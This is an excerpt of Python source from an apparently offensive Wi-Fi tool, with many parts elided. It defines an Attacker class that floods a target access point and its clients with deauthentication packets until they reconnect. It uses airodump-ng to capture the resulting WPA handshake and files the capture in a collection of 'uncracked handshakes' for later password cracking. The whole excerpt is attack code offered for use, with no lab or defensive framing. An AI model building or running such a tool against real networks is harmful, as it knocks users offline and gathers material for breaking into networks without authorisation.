...
class Attacker:
    def __init__(self, db, interface, essid, bssid, channel, clients, timeout=120):
        ...
        if (len(clients) > 1):
            print "\nInitializing attack on %s%s%s (channel: %s) [%s%s%s] with %d clients." % (
            G, essid, W, str(self.channel), G, bssid, W, len(clients))
        else:
            print "\nInitializing attack on %s%s%s (channel: %s) [%s%s%s] with %d client." % (
            G, essid, W, str(self.channel), G, bssid, W, len(clients))
        self.initTime = time()
        ...
        while (status != 1 and ((time() - self.initTime)) < timeout):
            ...
            if (self.sendDeauthBroadcast(self.interface, self.bssid, timeout) == 0):
                flush()
                write(
                    "%s[Time: %d secs]%s Broadcast %sDEA%su%sTH%s packets %ssent%s!                                                   \r" % (
                    BOLD + G, timeout - (time() - self.initTime), W, R, W, R, W, G, W))
            else:
                flush()
                write(
                    "%s[Time: %d secs]%s Broadcast %sDEA%su%sTH%s packets %sNOT%s %ssent%s!                                                   \r" % (
                    BOLD + G, timeout - (time() - self.initTime), W, R, W, R, W, R, W, G, W))
            ...
            for station in self.clients:
                ...
                if (self.sendDeauth(self.interface, self.bssid, station.mac, timeout) == 0):
                    flush()
                    write(
                        "%s[Time: %d secs]%s %sDEA%su%sTH%s packets %ssent%s!                                                   \r" % (
                        BOLD + G, timeout - (time() - self.initTime), W, R, W, R, W, G, W))
                else:
                    flush()
                    write(
                        "%s[Time: %d secs]%s %sDEA%su%sTH%s packets %sNOT%s %ssent%s!                                                   \r" % (
                        BOLD + G, timeout - (time() - self.initTime), W, R, W, R, W, R, W, G, W))

                flush()
                write("%s[Time: %d secs]%s Attacking %s       \r" % (
                BOLD + G, timeout - (time() - self.initTime), W, BOLD + G + station.mac + W))
            sleep(5)
        ...
        if (status == 1):
            ...
            if (addPcapFile(self.db, newName, ap_data) == 0):
                ...
                print G + "New handshake file " + W + "%s_%s.cap" % (
                essid, bssid) + G + " stored in your uncracked handshakes collection." + W
    ...
    def monitorAP(self, interface, bssid, channel):
        ...
        command = ["airodump-ng", interface, "--write", outputFile, "--bssid", bssid, "--channel", channel,
                   "--output-format", "pcap"]
    ...
    def sendDeauth(self, interface, bssid, client_mac, timeout):
        ...
        while deauthProcess.poll() is None:
            flush()
            write(
                "%s[Time: %d secs] %sWaiting %sdeauth process%s to terminate ...                                \r" % (
                BOLD + G, timeout - (time() - self.initTime), W, R, W))
    ...
    def sendDeauthBroadcast(self, interface, bssid, timeout):
        ...
        while deauthProcess.poll() is None:
            flush()
            write(
                "%s[Time: %d secs] %sWaiting broadcast %sdeauth process%s to terminate ...                                \r" % (
                BOLD + G, timeout - (time() - self.initTime), W, R, W))
            if (deauthProcess.poll() == 0):
                return 0
        return -1
